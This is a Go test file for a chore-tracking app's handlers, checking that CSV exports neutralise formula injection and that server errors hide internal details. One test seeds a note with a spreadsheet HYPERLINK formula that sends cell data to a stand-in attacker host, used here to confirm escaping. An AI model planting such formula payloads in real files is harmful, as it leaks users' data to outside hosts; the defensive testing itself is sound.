package handlers

import (
	"database/sql"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/DATA-DOG/go-sqlmock"

	"github.com/HammerMeetNail/nabu/internal/auth"
	"github.com/HammerMeetNail/nabu/internal/chore"
	"github.com/HammerMeetNail/nabu/internal/daynote"
	"github.com/HammerMeetNail/nabu/internal/household"
	logsvc "github.com/HammerMeetNail/nabu/internal/log"
	"github.com/HammerMeetNail/nabu/internal/mail"
	"github.com/HammerMeetNail/nabu/internal/notification"
	"github.com/HammerMeetNail/nabu/internal/push"
	"github.com/HammerMeetNail/nabu/internal/reminder"
	"github.com/HammerMeetNail/nabu/internal/schedule"
	"github.com/HammerMeetNail/nabu/internal/stats"
	"github.com/HammerMeetNail/nabu/internal/userprefs"
)

// ─── Finding 8: CSV formula injection ────────────────────────────────────────

func TestCSVSafe(t *testing.T) {
	cases := []struct {
		in, want string
	}{
		{"", ""},
		{"plain text", "plain text"},
		{"with spaces", "with spaces"},
		{"=1+1", "'=1+1"},
		{"+44 123", "'+44 123"},
		{"-cmd", "'-cmd"},
		{"@import", "'@import"},
		{"\tindented", "'\tindented"},
		{"\rcarriage", "'\rcarriage"},
		{"'already quoted", "'already quoted"}, // single-quote cells are safe and unchanged
		{" =leading space then formula", " =leading space then formula"}, // first char is a space, not a formula
	}
	for _, c := range cases {
		if got := csvSafe(c.in); got != c.want {
			t.Errorf("csvSafe(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestExportCSVFormulaInjection proves a user-controlled note beginning with
// "=" is emitted with a leading apostrophe in the exported CSV, so opening it
// in a spreadsheet never executes a formula.
func TestExportCSVFormulaInjection(t *testing.T) {
	authStore := auth.NewMemoryStore()
	authService := auth.NewService(authStore)
	authService.SetMailer(mail.NewMemorySender(), "http://localhost:8080")
	authService.SetAuditLogger(nil)

	householdStore := household.NewMemoryStore()
	householdService := household.NewService(householdStore, authService)

	logStore := logsvc.NewMemoryStore()
	logService := logsvc.NewService(logStore)
	handler := NewLogHandler(logService)

	user, session := quickRegister(authService, "alice@example.com")
	ctx := httptest.NewRequest(http.MethodGet, "/", nil).Context()
	hh, err := householdService.CreateHousehold(ctx, "My Home", "", user.ID)
	if err != nil {
		t.Fatalf("CreateHousehold: %v", err)
	}

	choreStore := chore.NewMemoryStore()
	choreService := chore.NewService(choreStore)
	ch, err := choreService.CreateChore(ctx, hh.ID, user.ID, "Sweep", "🧹", "#FF0000", "", nil, nil, nil, "", "", nil)
	if err != nil {
		t.Fatalf("CreateChore: %v", err)
	}
	now := time.Now()
	if _, err := logService.LogChore(ctx, hh.ID, user.ID, ch.ID, nil, `=HYPERLINK("https://evil.example/?d="&A1,"x")`, nil, nil, &now, nil, &now, nil, nil, nil, nil); err != nil {
		t.Fatalf("LogChore: %v", err)
	}

	handler.WithNotification(nil, choreStore, householdStore)

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/logs/export?start=2020-01-01&end=2026-12-31", nil), authService, session.ID)
	rec := httptest.NewRecorder()
	handler.Export(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("Export status = %d, body=%s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), `'=HYPERLINK`) {
		t.Fatalf("exported CSV must prefix formula cells with an apostrophe, got:\n%s", rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), `"=HYPERLINK`) && !strings.Contains(rec.Body.String(), `"'=HYPERLINK`) {
		t.Fatalf("unquoted formula cell leaked to CSV:\n%s", rec.Body.String())
	}
}

// ─── Finding 9: 5xx responses must not leak internals ────────────────────────
//
// Each test forces a store error by backing the handler's service with a
// sqlmock database that has no expectations (every call errors), then asserts
// the response is the expected static message and does not contain the raw
// error text.

// errSvc builds an authenticated user in household 1 with the given
// household-service setup, returning the session ID and auth service.
func errSvc(t *testing.T) (string, *auth.Service) {
	t.Helper()
	authStore := auth.NewMemoryStore()
	authService := auth.NewService(authStore)
	authService.SetMailer(mail.NewMemorySender(), "http://localhost:8080")
	authService.SetAuditLogger(nil)

	householdStore := household.NewMemoryStore()
	householdService := household.NewService(householdStore, authService)
	user, session := quickRegister(authService, "alice@example.com")
	if _, err := householdService.CreateHousehold(httptest.NewRequest(http.MethodGet, "/", nil).Context(), "My Home", "", user.ID); err != nil {
		t.Fatalf("CreateHousehold: %v", err)
	}
	return session.ID, authService
}

func failingDB(t *testing.T) *sql.DB {
	t.Helper()
	db, _, err := sqlmock.New()
	if err != nil {
		t.Fatalf("sqlmock.New: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })
	return db
}

func assertStatic500(t *testing.T, rec *httptest.ResponseRecorder, wantMsg, rawErr string) {
	t.Helper()
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want 500 (body=%s)", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), wantMsg) {
		t.Fatalf("body = %s, want to contain %q", rec.Body.String(), wantMsg)
	}
	if strings.Contains(rec.Body.String(), rawErr) {
		t.Fatalf("body = %s leaks store error text", rec.Body.String())
	}
}

func TestLogTodayStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewLogHandler(logsvc.NewService(logsvc.NewPostgresStore(failingDB(t))))

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/logs/today", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.Today(rec, req)

	assertStatic500(t, rec, "failed to load today's logs", "sqlmock")
}

func TestChoreListStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewChoreHandler(chore.NewService(chore.NewPostgresStore(failingDB(t))))

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/chores", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.List(rec, req)

	assertStatic500(t, rec, "failed to load chores", "sqlmock")
}

func TestChoreReminderPrefsListStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewChoreReminderPrefsHandler(reminder.NewPostgresStore(failingDB(t)))

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/reminder-prefs", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.List(rec, req)

	assertStatic500(t, rec, "failed to load reminder preferences", "sqlmock")
}

func TestPreferencesGetStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewPreferencesHandler(userprefs.NewService(userprefs.NewPostgresStore(failingDB(t))))

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/preferences", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.Get(rec, req)

	assertStatic500(t, rec, "failed to load preferences", "sqlmock")
}

func TestNotificationListStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewNotificationHandler(notification.NewService(notification.NewPostgresStore(failingDB(t))))

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/notifications", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.List(rec, req)

	assertStatic500(t, rec, "failed to load notifications", "sqlmock")
}

func TestStatsLeaderboardStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewStatsHandler(stats.NewService(logsvc.NewPostgresStore(failingDB(t)), nil), userprefs.NewMemoryStore())

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/stats/leaderboard", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.Leaderboard(rec, req)

	assertStatic500(t, rec, "failed to load leaderboard", "sqlmock")
}

func TestDayNoteListStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewDayNoteHandler(daynote.NewService(daynote.NewPostgresStore(failingDB(t))))

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/day-notes?start=2026-01-01&end=2026-01-31", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.List(rec, req)

	assertStatic500(t, rec, "failed to load day notes", "sqlmock")
}

func TestNotificationPrefsGetStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewNotificationPreferencesHandler(notification.NewService(notification.NewPostgresStore(failingDB(t))))

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/notification-preferences", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.Get(rec, req)

	assertStatic500(t, rec, "failed to load notification preferences", "sqlmock")
}

func TestScheduleListStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewScheduleHandler(schedule.NewPostgresStore(failingDB(t)), schedule.NewService())

	req := withUser(httptest.NewRequest(http.MethodGet, "/api/schedules", nil), authService, sessionID)
	rec := httptest.NewRecorder()
	handler.List(rec, req)

	assertStatic500(t, rec, "failed to load schedule", "sqlmock")
}

func TestPushSubscribeStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewPushHandler(push.NewPostgresStore(failingDB(t)))

	req := withUser(httptest.NewRequest(http.MethodPost, "/api/push/subscribe", strings.NewReader(
		`{"bindingId":"12345678-1234-1234-1234-123456789abc","subscription":{"endpoint":"https://fcm.googleapis.com/push/abc","keys":{"p256dh":"AAAA","auth":"BBBB"}}}`,
	)), authService, sessionID)
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	handler.Subscribe(rec, req)

	assertStatic500(t, rec, "failed to subscribe to push notifications", "sqlmock")
}

// TestHouseholdCreateStoreErrorHidesInternals proves the 409 path from
// CreateHousehold is a static message even when the store errors.
func TestHouseholdCreateStoreErrorHidesInternals(t *testing.T) {
	authStore := auth.NewMemoryStore()
	authService := auth.NewService(authStore)
	authService.SetMailer(mail.NewMemorySender(), "http://localhost:8080")
	authService.SetAuditLogger(nil)
	_, session := quickRegister(authService, "alice@example.com")

	handler := NewHouseholdHandler(household.NewService(household.NewPostgresStore(failingDB(t)), nil))

	req := withUser(httptest.NewRequest(http.MethodPost, "/api/household", strings.NewReader(`{"name":"My Home"}`)), authService, session.ID)
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	handler.Create(rec, req)

	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want 500 (body=%s)", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "could not create household") {
		t.Fatalf("body = %s, want static message", rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), "sqlmock") {
		t.Fatalf("body = %s leaks store error text", rec.Body.String())
	}
}

// TestLogCreateStoreErrorHidesInternals proves the 409 path from
// LogChoreIdempotent is a static message even when the store errors.
func TestLogCreateStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)
	handler := NewLogHandler(logsvc.NewService(logsvc.NewPostgresStore(failingDB(t))))

	req := withUser(httptest.NewRequest(http.MethodPost, "/api/logs", strings.NewReader(
		`{"choreId":1,"note":"done"}`,
	)), authService, sessionID)
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	handler.Create(rec, req)

	if rec.Code != http.StatusConflict {
		t.Fatalf("status = %d, want 409 (body=%s)", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "could not create log") {
		t.Fatalf("body = %s, want static message", rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), "sqlmock") {
		t.Fatalf("body = %s leaks store error text", rec.Body.String())
	}
}

// TestReminderSnoozeStoreErrorHidesInternals forces the follow-up deletion to
// fail after the chore ownership check passes, exercising the 500 path.
func TestReminderSnoozeStoreErrorHidesInternals(t *testing.T) {
	sessionID, authService := errSvc(t)

	db, mock, err := sqlmock.New()
	if err != nil {
		t.Fatalf("sqlmock.New: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })

	// Ownership check must succeed: chore 1 belongs to household 1.
	mock.ExpectQuery(`SELECT.*FROM chores WHERE id = \$1`).
		WithArgs(int64(1)).
		WillReturnRows(sqlmock.NewRows([]string{"id", "household_id", "name", "icon", "color", "sort_order", "category", "is_predefined", "predefined_key", "created_by", "created_at", "indicator_labels", "has_volume_ml", "indicator_defaults", "follow_up_enabled", "last_follow_up_minutes", "has_rating", "metric_type", "metric_unit", "subjects", "visibility"}).
			AddRow(1, 1, "Sweep", "🧹", "#FF0000", 0, "", false, "", 1, time.Now(), "[]", false, "[]", false, 0, false, "none", "", "[]", "household"))
	// The follow-up delete then fails.
	mock.ExpectExec(`DELETE FROM schedules WHERE chore_id = \$1 AND is_follow_up = true`).
		WithArgs(int64(1)).
		WillReturnError(fmt.Errorf("raw pg error"))

	handler := NewReminderSnoozeHandler(schedule.NewPostgresStore(db), chore.NewPostgresStore(db), nil)

	req := withUser(httptest.NewRequest(http.MethodPost, "/api/reminders/snooze", strings.NewReader(
		`{"choreId":1,"minutes":30}`,
	)), authService, sessionID)
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	handler.Snooze(rec, req)

	assertStatic500(t, rec, "failed to snooze reminder", "raw pg error")
}
